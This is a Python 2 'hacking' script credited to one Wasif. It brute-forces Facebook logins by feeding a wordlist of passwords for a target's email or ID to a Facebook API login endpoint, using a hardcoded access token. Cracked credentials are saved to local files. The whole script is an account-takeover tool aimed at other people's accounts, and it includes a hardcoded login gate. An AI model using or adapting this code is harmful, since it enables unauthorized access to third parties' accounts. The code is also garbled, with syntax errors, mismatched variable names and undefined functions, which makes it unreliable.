#coding=utf-8
#!/usr/bin/python2
#created by Wasif

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


#Loding Funcation :)
def baba(word):
    lix = ["[\033[1;92m■\033[1;97m□□□□□□□□□□□□□]","[\033[1;93m■■\033[1;97m□□□□□□□□□□□□]", "[\033[1;94m■■■\033[1;97m□□□□□□□□□□□]", "[\033[1;96m■■■■\033[1;97m□□□□□□□□□□]", "[\033[1;95m■■■■■\033[1;97m□□□□□□□□□]", "[\033[1;97m■■■■■■\033[1;97m□□□□□□□□]", "[\033[1;93m■■■■■■■\033[1;97m□□□□□□□]", "[\033[1;91m■■■■■■■■\033[1;97m□□□□□□]", "[\033[1;96m■■■■■■■■■\033[1;97m□□□□□]", "[\033[1;92m■■■■■■■■■■\033[1;97m□□□□]", "[\033[1;94m■■■■■■■■■■■\033[1;97m□□□]", "[\033[1;95m■■■■■■■■■■■■\033[1;97m□□]", "[\033[1;93m■■■■■■■■■■■■■\033[1;97m□]", "[\033[1;92m■■■■■■■■■■■■■■\033[1;97m]"]
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.09)
            sys.stdout.flush()

#####logo#####
logo""" 
\033[1;93m
 __      __    
/\ \  __/\ \   
\ \ \/\ \ \ \  
  \ \ \ \ \ \ \ 
    \ \ \_/ \_\ \
     \ `\___x___/
      '\/__//__/ 
 \033[1;93mpowerd by wasif
\033[1;92mUsman                                    
"""    
Username = "komal"
Correctpassword="899"
loop= "true"
while == "true"
username = raw_input("\033[1;96m[☆] \x1b[1;97mUSER ID \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;97mPASWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('clear')
    else:
        print "Wrong Username"
        os.system('clear')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50*"\033[1;96m▪"
		
		print "\x1b[1;32;40m[1] \033[1;33;40m══start Hacking"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_brut()
	     elif peak =="1":
		      os.system('clear')
		    print logo
		     brute()	
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\033[1;97m[+] \033[1;97mID\033[1;97m/\033[1;97mEmail \033[1;97mTarget \033[1;97m:\033[1;97m ')
            passw = raw_input('\033[1;97m[+] \033[1;97mWordlist \033[1;97mext(list.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;97m[\033[1;97m\xe2\x9c\x93\033[1;97m] \033[1;97mTarget \033[1;97m:\033[1;97m ' + email
            print '\033[1;97m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;97m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;97m[+] \033[1;97mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                 
                            keluar()
                except requests.exceptions.ConnectionError:
                    print "\033[1;97m[!] Connection Error"
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
                                                       
                                                       

